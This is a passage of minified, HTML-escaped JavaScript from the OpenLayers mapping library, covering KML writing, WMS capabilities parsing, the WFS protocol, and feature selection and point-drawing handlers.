b=this.createElementNS(this.kmlns,"name"),c=this.createTextNode(this.foldersName);b.appendChild(c);a.appendChild(b)}this.foldersDesc&amp;&amp; (b=this.createElementNS(this.kmlns,"description"),c=this.createTextNode(this.foldersDesc),b.appendChild(c),a.appendChild(b));return a},createPlacemarkXML:function(a){var b=this.createElementNS(this.kmlns,"name"),c=a.style&amp;&amp;a.style.label?a.style.label:a.id;b.appendChild(this.createTextNode(a.attributes.name||c));var d=this.createElementNS(this.kmlns,"description");d.appendChild(this.createTextNode(a.attributes.description||this.placemarksDesc));c=this.createElementNS(this.kmlns,"Placemark");null!= a.fid&amp;&amp;c.setAttribute("id",a.fid);c.appendChild(b);c.appendChild(d);b=this.buildGeometryNode(a.geometry);c.appendChild(b);a.attributes&amp;&amp;(a=this.buildExtendedData(a.attributes))&amp;&amp;c.appendChild(a);return c},buildGeometryNode:function(a){var b=a.CLASS_NAME,b=b.substring(b.lastIndexOf(".")+1),b=this.buildGeometry[b.toLowerCase()],c=null;b&amp;&amp;(c=b.apply(this,[a]));return c},buildGeometry:{point:function(a){var b=this.createElementNS(this.kmlns,"Point");b.appendChild(this.buildCoordinatesNode(a));return b}, multipoint:function(a){return this.buildGeometry.collection.apply(this,[a])},linestring:function(a){var b=this.createElementNS(this.kmlns,"LineString");b.appendChild(this.buildCoordinatesNode(a));return b},multilinestring:function(a){return this.buildGeometry.collection.apply(this,[a])},linearring:function(a){var b=this.createElementNS(this.kmlns,"LinearRing");b.appendChild(this.buildCoordinatesNode(a));return b},polygon:function(a){var b=this.createElementNS(this.kmlns,"Polygon");a=a.components; for(var c,d,e=0,f=a.length;e&lt;f;++e)c=0==e?"outerBoundaryIs":"innerBoundaryIs",c=this.createElementNS(this.kmlns,c),d=this.buildGeometry.linearring.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b},multipolygon:function(a){return this.buildGeometry.collection.apply(this,[a])},collection:function(a){for(var b=this.createElementNS(this.kmlns,"MultiGeometry"),c,d=0,e=a.components.length;d&lt;e;++d)(c=this.buildGeometryNode.apply(this,[a.components[d]]))&amp;&amp;b.appendChild(c);return b}},buildCoordinatesNode:function(a){var b= this.createElementNS(this.kmlns,"coordinates"),c;if(c=a.components){for(var d=c.length,e=Array(d),f=0;f&lt;d;++f)a=c[f],e[f]=this.buildCoordinates(a);c=e.join(" ")}else c=this.buildCoordinates(a);c=this.createTextNode(c);b.appendChild(c);return b},buildCoordinates:function(a){this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));return a.x+","+a.y},buildExtendedData:function(a){var b=this.createElementNS(this.kmlns,"ExtendedData"), c;for(c in a)if(a[c]&amp;&amp;"name"!=c&amp;&amp;"description"!=c&amp;&amp;"styleUrl"!=c){var d=this.createElementNS(this.kmlns,"Data");d.setAttribute("name",c);var e=this.createElementNS(this.kmlns,"value");if("object"==typeof a[c]){if(a[c].value&amp;&amp;e.appendChild(this.createTextNode(a[c].value)),a[c].displayName){var f=this.createElementNS(this.kmlns,"displayName");f.appendChild(this.getXMLDoc().createCDATASection(a[c].displayName));d.appendChild(f)}}else e.appendChild(this.createTextNode(a[c]));d.appendChild(e);b.appendChild(d)}return this.isSimpleContent(b)? null:b},CLASS_NAME:"OpenLayers.Format.KML"});OpenLayers.Format.WMSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.1.1",profile:null,CLASS_NAME:"OpenLayers.Format.WMSCapabilities"});OpenLayers.Format.WMSCapabilities.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{wms:"http://www.opengis.net/wms",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},defaultPrefix:"wms",read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=a;a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var c={};this.readNode(a,c);void 0===c.service&amp;&amp;(a=new OpenLayers.Format.OGCExceptionReport,c.error=a.read(b));return c},readers:{wms:{Service:function(a, b){b.service={};this.readChildNodes(a,b.service)},Name:function(a,b){b.name=this.getChildValue(a)},Title:function(a,b){b.title=this.getChildValue(a)},Abstract:function(a,b){b["abstract"]=this.getChildValue(a)},BoundingBox:function(a,b){var c={};c.bbox=[parseFloat(a.getAttribute("minx")),parseFloat(a.getAttribute("miny")),parseFloat(a.getAttribute("maxx")),parseFloat(a.getAttribute("maxy"))];var d={x:parseFloat(a.getAttribute("resx")),y:parseFloat(a.getAttribute("resy"))};isNaN(d.x)&amp;&amp;isNaN(d.y)||(c.res= d);return c},OnlineResource:function(a,b){b.href=this.getAttributeNS(a,this.namespaces.xlink,"href")},ContactInformation:function(a,b){b.contactInformation={};this.readChildNodes(a,b.contactInformation)},ContactPersonPrimary:function(a,b){b.personPrimary={};this.readChildNodes(a,b.personPrimary)},ContactPerson:function(a,b){b.person=this.getChildValue(a)},ContactOrganization:function(a,b){b.organization=this.getChildValue(a)},ContactPosition:function(a,b){b.position=this.getChildValue(a)},ContactAddress:function(a, b){b.contactAddress={};this.readChildNodes(a,b.contactAddress)},AddressType:function(a,b){b.type=this.getChildValue(a)},Address:function(a,b){b.address=this.getChildValue(a)},City:function(a,b){b.city=this.getChildValue(a)},StateOrProvince:function(a,b){b.stateOrProvince=this.getChildValue(a)},PostCode:function(a,b){b.postcode=this.getChildValue(a)},Country:function(a,b){b.country=this.getChildValue(a)},ContactVoiceTelephone:function(a,b){b.phone=this.getChildValue(a)},ContactFacsimileTelephone:function(a, b){b.fax=this.getChildValue(a)},ContactElectronicMailAddress:function(a,b){b.email=this.getChildValue(a)},Fees:function(a,b){var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.fees=c)},AccessConstraints:function(a,b){var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.accessConstraints=c)},Capability:function(a,b){b.capability={nestedLayers:[],layers:[]};this.readChildNodes(a,b.capability)},Request:function(a,b){b.request={};this.readChildNodes(a,b.request)},GetCapabilities:function(a, b){b.getcapabilities={formats:[]};this.readChildNodes(a,b.getcapabilities)},Format:function(a,b){OpenLayers.Util.isArray(b.formats)?b.formats.push(this.getChildValue(a)):b.format=this.getChildValue(a)},DCPType:function(a,b){this.readChildNodes(a,b)},HTTP:function(a,b){this.readChildNodes(a,b)},Get:function(a,b){b.get={};this.readChildNodes(a,b.get);b.href||(b.href=b.get.href)},Post:function(a,b){b.post={};this.readChildNodes(a,b.post);b.href||(b.href=b.get.href)},GetMap:function(a,b){b.getmap={formats:[]}; this.readChildNodes(a,b.getmap)},GetFeatureInfo:function(a,b){b.getfeatureinfo={formats:[]};this.readChildNodes(a,b.getfeatureinfo)},Exception:function(a,b){b.exception={formats:[]};this.readChildNodes(a,b.exception)},Layer:function(a,b){var c,d;b.capability?(d=b.capability,c=b):d=b;var e=a.getAttributeNode("queryable"),f=e&amp;&amp;e.specified?a.getAttribute("queryable"):null,g=(e=a.getAttributeNode("cascaded"))&amp;&amp;e.specified?a.getAttribute("cascaded"):null,e=(e=a.getAttributeNode("opaque"))&amp;&amp;e.specified? a.getAttribute("opaque"):null,h=a.getAttribute("noSubsets"),k=a.getAttribute("fixedWidth"),l=a.getAttribute("fixedHeight"),m=c||{},n=OpenLayers.Util.extend;c={nestedLayers:[],styles:c?[].concat(c.styles):[],srs:c?n({},m.srs):{},metadataURLs:[],bbox:c?n({},m.bbox):{},llbbox:m.llbbox,dimensions:c?n({},m.dimensions):{},authorityURLs:c?n({},m.authorityURLs):{},identifiers:{},keywords:[],queryable:f&amp;&amp;""!==f?"1"===f||"true"===f:m.queryable||!1,cascaded:null!==g?parseInt(g):m.cascaded||0,opaque:e?"1"=== e||"true"===e:m.opaque||!1,noSubsets:null!==h?"1"===h||"true"===h:m.noSubsets||!1,fixedWidth:null!=k?parseInt(k):m.fixedWidth||0,fixedHeight:null!=l?parseInt(l):m.fixedHeight||0,minScale:m.minScale,maxScale:m.maxScale,attribution:m.attribution};b.nestedLayers.push(c);c.capability=d;this.readChildNodes(a,c);delete c.capability;c.name&amp;&amp;(f=c.name.split(":"),g=d.request,e=g.getfeatureinfo,0&lt;f.length&amp;&amp;(c.prefix=f[0]),d.layers.push(c),void 0===c.formats&amp;&amp;(c.formats=g.getmap.formats),void 0===c.infoFormats&amp;&amp; e&amp;&amp;(c.infoFormats=e.formats))},Attribution:function(a,b){b.attribution={};this.readChildNodes(a,b.attribution)},LogoURL:function(a,b){b.logo={width:a.getAttribute("width"),height:a.getAttribute("height")};this.readChildNodes(a,b.logo)},Style:function(a,b){var c={};b.styles.push(c);this.readChildNodes(a,c)},LegendURL:function(a,b){var c={width:a.getAttribute("width"),height:a.getAttribute("height")};b.legend=c;this.readChildNodes(a,c)},MetadataURL:function(a,b){var c={type:a.getAttribute("type")}; b.metadataURLs.push(c);this.readChildNodes(a,c)},DataURL:function(a,b){b.dataURL={};this.readChildNodes(a,b.dataURL)},FeatureListURL:function(a,b){b.featureListURL={};this.readChildNodes(a,b.featureListURL)},AuthorityURL:function(a,b){var c=a.getAttribute("name"),d={};this.readChildNodes(a,d);b.authorityURLs[c]=d.href},Identifier:function(a,b){var c=a.getAttribute("authority");b.identifiers[c]=this.getChildValue(a)},KeywordList:function(a,b){this.readChildNodes(a,b)},SRS:function(a,b){b.srs[this.getChildValue(a)]= !0}}},CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1"});OpenLayers.Format.WMSCapabilities.v1_1=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1,{readers:{wms:OpenLayers.Util.applyDefaults({WMT_MS_Capabilities:function(a,b){this.readChildNodes(a,b)},Keyword:function(a,b){b.keywords&amp;&amp;b.keywords.push(this.getChildValue(a))},DescribeLayer:function(a,b){b.describelayer={formats:[]};this.readChildNodes(a,b.describelayer)},GetLegendGraphic:function(a,b){b.getlegendgraphic={formats:[]};this.readChildNodes(a,b.getlegendgraphic)},GetStyles:function(a,b){b.getstyles= {formats:[]};this.readChildNodes(a,b.getstyles)},PutStyles:function(a,b){b.putstyles={formats:[]};this.readChildNodes(a,b.putstyles)},UserDefinedSymbolization:function(a,b){var c={supportSLD:1==parseInt(a.getAttribute("SupportSLD")),userLayer:1==parseInt(a.getAttribute("UserLayer")),userStyle:1==parseInt(a.getAttribute("UserStyle")),remoteWFS:1==parseInt(a.getAttribute("RemoteWFS"))};b.userSymbols=c},LatLonBoundingBox:function(a,b){b.llbbox=[parseFloat(a.getAttribute("minx")),parseFloat(a.getAttribute("miny")), parseFloat(a.getAttribute("maxx")),parseFloat(a.getAttribute("maxy"))]},BoundingBox:function(a,b){var c=OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms.BoundingBox.apply(this,[a,b]);c.srs=a.getAttribute("SRS");b.bbox[c.srs]=c},ScaleHint:function(a,b){var c=a.getAttribute("min"),d=a.getAttribute("max"),e=Math.pow(2,0.5),f=OpenLayers.INCHES_PER_UNIT.m;0!=c&amp;&amp;(b.maxScale=parseFloat((c/e*f*OpenLayers.DOTS_PER_INCH).toPrecision(13)));d!=Number.POSITIVE_INFINITY&amp;&amp;(b.minScale=parseFloat((d/e*f* OpenLayers.DOTS_PER_INCH).toPrecision(13)))},Dimension:function(a,b){var c={name:a.getAttribute("name").toLowerCase(),units:a.getAttribute("units"),unitsymbol:a.getAttribute("unitSymbol")};b.dimensions[c.name]=c},Extent:function(a,b){var c=a.getAttribute("name").toLowerCase();if(c in b.dimensions){c=b.dimensions[c];c.nearestVal="1"===a.getAttribute("nearestValue");c.multipleVal="1"===a.getAttribute("multipleValues");c.current="1"===a.getAttribute("current");c["default"]=a.getAttribute("default")|| "";var d=this.getChildValue(a);c.values=d.split(",")}}},OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms)},CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_1"});OpenLayers.Format.WMSCapabilities.v1_1_0=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_1,{version:"1.1.0",readers:{wms:OpenLayers.Util.applyDefaults({SRS:function(a,b){for(var c=this.getChildValue(a).split(/ +/),d=0,e=c.length;d&lt;e;d++)b.srs[c[d]]=!0}},OpenLayers.Format.WMSCapabilities.v1_1.prototype.readers.wms)},CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_1_0"});OpenLayers.Protocol.WFS.v1=OpenLayers.Class(OpenLayers.Protocol,{version:null,srsName:"EPSG:4326",featureType:null,featureNS:null,geometryName:"the_geom",schema:null,featurePrefix:"feature",formatOptions:null,readFormat:null,readOptions:null,initialize:function(a){OpenLayers.Protocol.prototype.initialize.apply(this,[a]);a.format||(this.format=OpenLayers.Format.WFST(OpenLayers.Util.extend({version:this.version,featureType:this.featureType,featureNS:this.featureNS,featurePrefix:this.featurePrefix,geometryName:this.geometryName, srsName:this.srsName,schema:this.schema},this.formatOptions)));!a.geometryName&amp;&amp;1&lt;parseFloat(this.format.version)&amp;&amp;this.setGeometryName(null)},destroy:function(){this.options&amp;&amp;!this.options.format&amp;&amp;this.format.destroy();this.format=null;OpenLayers.Protocol.prototype.destroy.apply(this)},read:function(a){OpenLayers.Protocol.prototype.read.apply(this,arguments);a=OpenLayers.Util.extend({},a);OpenLayers.Util.applyDefaults(a,this.options||{});var b=new OpenLayers.Protocol.Response({requestType:"read"}), c=OpenLayers.Format.XML.prototype.write.apply(this.format,[this.format.writeNode("wfs:GetFeature",a)]);b.priv=OpenLayers.Request.POST({url:a.url,callback:this.createCallback(this.handleRead,b,a),params:a.params,headers:a.headers,data:c});return b},setFeatureType:function(a){this.featureType=a;this.format.featureType=a},setGeometryName:function(a){this.geometryName=a;this.format.geometryName=a},handleRead:function(a,b){b=OpenLayers.Util.extend({},b);OpenLayers.Util.applyDefaults(b,this.options);if(b.callback){var c= a.priv;200&lt;=c.status&amp;&amp;300>c.status?(c=this.parseResponse(c,b.readOptions))&amp;&amp;!1!==c.success?(b.readOptions&amp;&amp;"object"==b.readOptions.output?OpenLayers.Util.extend(a,c):a.features=c,a.code=OpenLayers.Protocol.Response.SUCCESS):(a.code=OpenLayers.Protocol.Response.FAILURE,a.error=c):a.code=OpenLayers.Protocol.Response.FAILURE;b.callback.call(b.scope,a)}},parseResponse:function(a,b){var c=a.responseXML;c&amp;&amp;c.documentElement||(c=a.responseText);if(!c||0>=c.length)return null;c=null!==this.readFormat?this.readFormat.read(c): this.format.read(c,b);if(!this.featureNS){var d=this.readFormat||this.format;this.featureNS=d.featureNS;d.autoConfig=!1;this.geometryName||this.setGeometryName(d.geometryName)}return c},commit:function(a,b){b=OpenLayers.Util.extend({},b);OpenLayers.Util.applyDefaults(b,this.options);var c=new OpenLayers.Protocol.Response({requestType:"commit",reqFeatures:a});c.priv=OpenLayers.Request.POST({url:b.url,headers:b.headers,data:this.format.write(a,b),callback:this.createCallback(this.handleCommit,c,b)}); return c},handleCommit:function(a,b){if(b.callback){var c=a.priv,d=c.responseXML;d&amp;&amp;d.documentElement||(d=c.responseText);c=this.format.read(d)||{};a.insertIds=c.insertIds||[];c.success?a.code=OpenLayers.Protocol.Response.SUCCESS:(a.code=OpenLayers.Protocol.Response.FAILURE,a.error=c);b.callback.call(b.scope,a)}},filterDelete:function(a,b){b=OpenLayers.Util.extend({},b);OpenLayers.Util.applyDefaults(b,this.options);new OpenLayers.Protocol.Response({requestType:"commit"});var c=this.format.createElementNSPlus("wfs:Transaction", {attributes:{service:"WFS",version:this.version}}),d=this.format.createElementNSPlus("wfs:Delete",{attributes:{typeName:(b.featureNS?this.featurePrefix+":":"")+b.featureType}});b.featureNS&amp;&amp;d.setAttribute("xmlns:"+this.featurePrefix,b.featureNS);var e=this.format.writeNode("ogc:Filter",a);d.appendChild(e);c.appendChild(d);c=OpenLayers.Format.XML.prototype.write.apply(this.format,[c]);return OpenLayers.Request.POST({url:this.url,callback:b.callback||function(){},data:c})},abort:function(a){a&amp;&amp;a.priv.abort()}, CLASS_NAME:"OpenLayers.Protocol.WFS.v1"});OpenLayers.Handler.Feature=OpenLayers.Class(OpenLayers.Handler,{EVENTMAP:{click:{"in":"click",out:"clickout"},mousemove:{"in":"over",out:"out"},dblclick:{"in":"dblclick",out:null},mousedown:{"in":null,out:null},mouseup:{"in":null,out:null},touchstart:{"in":"click",out:"clickout"}},feature:null,lastFeature:null,down:null,up:null,clickTolerance:4,geometryTypes:null,stopClick:!0,stopDown:!0,stopUp:!1,initialize:function(a,b,c,d){OpenLayers.Handler.prototype.initialize.apply(this,[a,c,d]);this.layer= b},touchstart:function(a){this.startTouch();return OpenLayers.Event.isMultiTouch(a)?!0:this.mousedown(a)},touchmove:function(a){OpenLayers.Event.preventDefault(a)},mousedown:function(a){if(OpenLayers.Event.isLeftClick(a)||OpenLayers.Event.isSingleTouch(a))this.down=a.xy;return this.handle(a)?!this.stopDown:!0},mouseup:function(a){this.up=a.xy;return this.handle(a)?!this.stopUp:!0},click:function(a){return this.handle(a)?!this.stopClick:!0},mousemove:function(a){if(!this.callbacks.over&amp;&amp;!this.callbacks.out)return!0; this.handle(a);return!0},dblclick:function(a){return!this.handle(a)},geometryTypeMatches:function(a){return null==this.geometryTypes||-1&lt;OpenLayers.Util.indexOf(this.geometryTypes,a.geometry.CLASS_NAME)},handle:function(a){this.feature&amp;&amp;!this.feature.layer&amp;&amp;(this.feature=null);var b=a.type,c=!1,d=!!this.feature,e="click"==b||"dblclick"==b||"touchstart"==b;(this.feature=this.layer.getFeatureFromEvent(a))&amp;&amp;!this.feature.layer&amp;&amp;(this.feature=null);this.lastFeature&amp;&amp;!this.lastFeature.layer&amp;&amp;(this.lastFeature= null);this.feature?("touchstart"===b&amp;&amp;OpenLayers.Event.preventDefault(a),a=this.feature!=this.lastFeature,this.geometryTypeMatches(this.feature)?(d&amp;&amp;a?(this.lastFeature&amp;&amp;this.triggerCallback(b,"out",[this.lastFeature]),this.triggerCallback(b,"in",[this.feature])):d&amp;&amp;!e||this.triggerCallback(b,"in",[this.feature]),this.lastFeature=this.feature,c=!0):(this.lastFeature&amp;&amp;(d&amp;&amp;a||e)&amp;&amp;this.triggerCallback(b,"out",[this.lastFeature]),this.feature=null)):this.lastFeature&amp;&amp;(d||e)&amp;&amp;this.triggerCallback(b,"out", [this.lastFeature]);return c},triggerCallback:function(a,b,c){if(b=this.EVENTMAP[a][b])"click"==a&amp;&amp;this.up&amp;&amp;this.down?(Math.sqrt(Math.pow(this.up.x-this.down.x,2)+Math.pow(this.up.y-this.down.y,2))&lt;=this.clickTolerance&amp;&amp;this.callback(b,c),this.up=this.down=null):this.callback(b,c)},activate:function(){var a=!1;OpenLayers.Handler.prototype.activate.apply(this,arguments)&amp;&amp;(this.moveLayerToTop(),this.map.events.on({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this}),a=!0); return a},deactivate:function(){var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.moveLayerBack(),this.up=this.down=this.lastFeature=this.feature=null,this.map.events.un({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this}),a=!0);return a},handleMapEvents:function(a){"removelayer"!=a.type&amp;&amp;"order"!=a.property||this.moveLayerToTop()},moveLayerToTop:function(){var a=Math.max(this.map.Z_INDEX_BASE.Feature-1,this.layer.getZIndex())+1;this.layer.setZIndex(a)}, moveLayerBack:function(){var a=this.layer.getZIndex()-1;a>=this.map.Z_INDEX_BASE.Feature?this.layer.setZIndex(a):this.map.setLayerZIndex(this.layer,this.map.getLayerIndex(this.layer))},CLASS_NAME:"OpenLayers.Handler.Feature"});OpenLayers.Layer.Vector.RootContainer=OpenLayers.Class(OpenLayers.Layer.Vector,{displayInLayerSwitcher:!1,layers:null,display:function(){},getFeatureFromEvent:function(a){for(var b=this.layers,c,d=0;d&lt;b.length;d++)if(c=b[d].getFeatureFromEvent(a))return c},setMap:function(a){OpenLayers.Layer.Vector.prototype.setMap.apply(this,arguments);this.collectRoots();a.events.register("changelayer",this,this.handleChangeLayer)},removeMap:function(a){a.events.unregister("changelayer",this,this.handleChangeLayer); this.resetRoots();OpenLayers.Layer.Vector.prototype.removeMap.apply(this,arguments)},collectRoots:function(){for(var a,b=0;b&lt;this.map.layers.length;++b)a=this.map.layers[b],-1!=OpenLayers.Util.indexOf(this.layers,a)&amp;&amp;a.renderer.moveRoot(this.renderer)},resetRoots:function(){for(var a,b=0;b&lt;this.layers.length;++b)a=this.layers[b],this.renderer&amp;&amp;a.renderer.getRenderLayerId()==this.id&amp;&amp;this.renderer.moveRoot(a.renderer)},handleChangeLayer:function(a){var b=a.layer;"order"==a.property&amp;&amp;-1!=OpenLayers.Util.indexOf(this.layers, b)&amp;&amp;(this.resetRoots(),this.collectRoots())},CLASS_NAME:"OpenLayers.Layer.Vector.RootContainer"});OpenLayers.Control.SelectFeature=OpenLayers.Class(OpenLayers.Control,{multipleKey:null,toggleKey:null,multiple:!1,clickout:!0,toggle:!1,hover:!1,highlightOnly:!1,box:!1,onBeforeSelect:function(){},onSelect:function(){},onUnselect:function(){},scope:null,geometryTypes:null,layer:null,layers:null,callbacks:null,selectStyle:null,renderIntent:"select",handlers:null,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);null===this.scope&amp;&amp;(this.scope=this);this.initLayer(a);var c= {click:this.clickFeature,clickout:this.clickoutFeature};this.hover&amp;&amp;(c.over=this.overFeature,c.out=this.outFeature);this.callbacks=OpenLayers.Util.extend(c,this.callbacks);this.handlers={feature:new OpenLayers.Handler.Feature(this,this.layer,this.callbacks,{geometryTypes:this.geometryTypes})};this.box&amp;&amp;(this.handlers.box=new OpenLayers.Handler.Box(this,{done:this.selectBox},{boxDivClassName:"olHandlerBoxSelectFeature"}))},initLayer:function(a){OpenLayers.Util.isArray(a)?(this.layers=a,this.layer= new OpenLayers.Layer.Vector.RootContainer(this.id+"_container",{layers:a})):this.layer=a},destroy:function(){this.active&amp;&amp;this.layers&amp;&amp;this.map.removeLayer(this.layer);OpenLayers.Control.prototype.destroy.apply(this,arguments);this.layers&amp;&amp;this.layer.destroy()},activate:function(){this.active||(this.layers&amp;&amp;this.map.addLayer(this.layer),this.handlers.feature.activate(),this.box&amp;&amp;this.handlers.box&amp;&amp;this.handlers.box.activate());return OpenLayers.Control.prototype.activate.apply(this,arguments)},deactivate:function(){this.active&amp;&amp; (this.handlers.feature.deactivate(),this.handlers.box&amp;&amp;this.handlers.box.deactivate(),this.layers&amp;&amp;this.map.removeLayer(this.layer));return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},unselectAll:function(a){var b=this.layers||[this.layer],c,d,e,f;for(e=0;e&lt;b.length;++e)if(c=b[e],f=0,null!=c.selectedFeatures)for(;c.selectedFeatures.length>f;)d=c.selectedFeatures[f],a&amp;&amp;a.except==d?++f:this.unselect(d)},clickFeature:function(a){this.hover||(-1&lt;OpenLayers.Util.indexOf(a.layer.selectedFeatures, a)?this.toggleSelect()?this.unselect(a):this.multipleSelect()||this.unselectAll({except:a}):(this.multipleSelect()||this.unselectAll({except:a}),this.select(a)))},multipleSelect:function(){return this.multiple||this.handlers.feature.evt&amp;&amp;this.handlers.feature.evt[this.multipleKey]},toggleSelect:function(){return this.toggle||this.handlers.feature.evt&amp;&amp;this.handlers.feature.evt[this.toggleKey]},clickoutFeature:function(a){!this.hover&amp;&amp;this.clickout&amp;&amp;this.unselectAll()},overFeature:function(a){var b= a.layer;this.hover&amp;&amp;(this.highlightOnly?this.highlight(a):-1==OpenLayers.Util.indexOf(b.selectedFeatures,a)&amp;&amp;this.select(a))},outFeature:function(a){if(this.hover)if(this.highlightOnly){if(a._lastHighlighter==this.id)if(a._prevHighlighter&amp;&amp;a._prevHighlighter!=this.id){delete a._lastHighlighter;var b=this.map.getControl(a._prevHighlighter);b&amp;&amp;b.highlight(a)}else this.unhighlight(a)}else this.unselect(a)},highlight:function(a){var b=a.layer;!1!==this.events.triggerEvent("beforefeaturehighlighted",{feature:a})&amp;&amp; (a._prevHighlighter=a._lastHighlighter,a._lastHighlighter=this.id,b.drawFeature(a,this.selectStyle||this.renderIntent),this.events.triggerEvent("featurehighlighted",{feature:a}))},unhighlight:function(a){var b=a.layer;void 0==a._prevHighlighter?delete a._lastHighlighter:(a._prevHighlighter!=this.id&amp;&amp;(a._lastHighlighter=a._prevHighlighter),delete a._prevHighlighter);b.drawFeature(a,a.style||a.layer.style||"default");this.events.triggerEvent("featureunhighlighted",{feature:a})},select:function(a){var b= this.onBeforeSelect.call(this.scope,a),c=a.layer;!1!==b&amp;&amp;(b=c.events.triggerEvent("beforefeatureselected",{feature:a}),!1!==b&amp;&amp;(c.selectedFeatures.push(a),this.highlight(a),this.handlers.feature.lastFeature||(this.handlers.feature.lastFeature=c.selectedFeatures[0]),c.events.triggerEvent("featureselected",{feature:a}),this.onSelect.call(this.scope,a)))},unselect:function(a){var b=a.layer;this.unhighlight(a);OpenLayers.Util.removeItem(b.selectedFeatures,a);b.events.triggerEvent("featureunselected", {feature:a});this.onUnselect.call(this.scope,a)},selectBox:function(a){if(a instanceof OpenLayers.Bounds){var b=this.map.getLonLatFromPixel({x:a.left,y:a.bottom});a=this.map.getLonLatFromPixel({x:a.right,y:a.top});b=new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat);this.multipleSelect()||this.unselectAll();a=this.multiple;this.multiple=!0;var c=this.layers||[this.layer];this.events.triggerEvent("boxselectionstart",{layers:c});for(var d,e=0;e&lt;c.length;++e){d=c[e];for(var f=0,g=d.features.length;f&lt;g;++f){var h= d.features[f];h.getVisibility()&amp;&amp;(null==this.geometryTypes||-1&lt;OpenLayers.Util.indexOf(this.geometryTypes,h.geometry.CLASS_NAME))&amp;&amp;b.toGeometry().intersects(h.geometry)&amp;&amp;-1==OpenLayers.Util.indexOf(d.selectedFeatures,h)&amp;&amp;this.select(h)}}this.multiple=a;this.events.triggerEvent("boxselectionend",{layers:c})}},setMap:function(a){this.handlers.feature.setMap(a);this.box&amp;&amp;this.handlers.box.setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)},setLayer:function(a){var b=this.active;this.unselectAll(); this.deactivate();this.layers&amp;&amp;(this.layer.destroy(),this.layers=null);this.initLayer(a);this.handlers.feature.layer=this.layer;b&amp;&amp;this.activate()},CLASS_NAME:"OpenLayers.Control.SelectFeature"});OpenLayers.Handler.Point=OpenLayers.Class(OpenLayers.Handler,{point:null,layer:null,multi:!1,citeCompliant:!1,mouseDown:!1,stoppedDown:null,lastDown:null,lastUp:null,persist:!1,stopDown:!1,stopUp:!1,layerOptions:null,pixelTolerance:5,lastTouchPx:null,initialize:function(a,b,c){c&amp;&amp;c.layerOptions&amp;&amp;c.layerOptions.styleMap||(this.style=OpenLayers.Util.extend(OpenLayers.Feature.Vector.style["default"],{}));OpenLayers.Handler.prototype.initialize.apply(this,arguments)},activate:function(){if(!OpenLayers.Handler.prototype.activate.apply(this, arguments))return!1;var a=OpenLayers.Util.extend({displayInLayerSwitcher:!1,calculateInRange:OpenLayers.Function.True,wrapDateLine:this.citeCompliant},this.layerOptions);this.layer=new OpenLayers.Layer.Vector(this.CLASS_NAME,a);this.map.addLayer(this.layer);return!0},createFeature:function(a){a=this.layer.getLonLatFromViewPortPx(a);a=new OpenLayers.Geometry.Point(a.lon,a.lat);this.point=new OpenLayers.Feature.Vector(a);this.callback("create",[this.point.geometry,this.point]);this.point.geometry.clearBounds(); this.layer.addFeatures([this.point],{silent:!0})},deactivate:function(){if(!OpenLayers.Handler.prototype.deactivate.apply(this,arguments))return!1;this.cancel();null!=this.layer.map&amp;&amp;(this.destroyFeature(!0),this.layer.destroy(!1));this.layer=null;return!0},destroyFeature:function(a){!this.layer||!a&amp;&amp;this.persist||this.layer.destroyFeatures();this.point=null},destroyPersistedFeature:function(){var a=this.layer;a&amp;&amp;1&lt;a.features.length&amp;&amp;this.layer.features[0].destroy()},finalize:function(a){this.mouseDown= !1;this.lastTouchPx=this.lastUp=this.lastDown=null;this.callback(a?"cancel":"done",[this.geometryClone()]);this.destroyFeature(a)},cancel:function(){this.finalize(!0)},click:function(a){OpenLayers.Event.stop(a);return!1},dblclick:function(a){OpenLayers.Event.stop(a);return!1},modifyFeature:function(a){this.point||this.createFeature(a);a=this.layer.getLonLatFromViewPortPx(a);this.point.geometry.x=a.lon;this.point.geometry.y=a.lat;this.callback("modify",[this.point.geometry,this.point,!1]);this.point.geometry.clearBounds(); this.drawFeature()},drawFeature:function(){this.layer.drawFeature(this.point,this.style)},getGeometry:function(){var a=this.point&amp;&amp;this.point.geometry;a&amp;&amp;this.multi&amp;&amp;(a=new OpenLayers.Geometry.MultiPoint([a]));return a},geometryClone:function(){var a=this.getGeometry();return a&amp;&amp;a.clone()},mousedown:function(a){return this.down(a)},touchstart:function(a){this.startTouch();this.lastTouchPx=a.xy;return this.down(a)},mousemove:function(a){return this.move(a)},touchmove:function(a){this.lastTouchPx=a.xy; return this.move(a)},mouseup:function(a){return this.up(a)},touchend:function(a){a.xy=this.lastTouchPx;return this.up(a)},down:function(a){this.mouseDown=!0;this.lastDown=a.xy;this.touch||this.modifyFeature(a.xy);this.stoppedDown=this.stopDown;return!this.stopDown},move:function(a){this.touch||this.mouseDown&amp;&amp;!this.stoppedDown||this.modifyFeature(a.xy);return!0},up:function(a){this.mouseDown=!1;this.stoppedDown=this.stopDown;if(!this.checkModifiers(a)||this.lastUp&amp;&amp;this.lastUp.equals(a.xy)||!this.lastDown|| 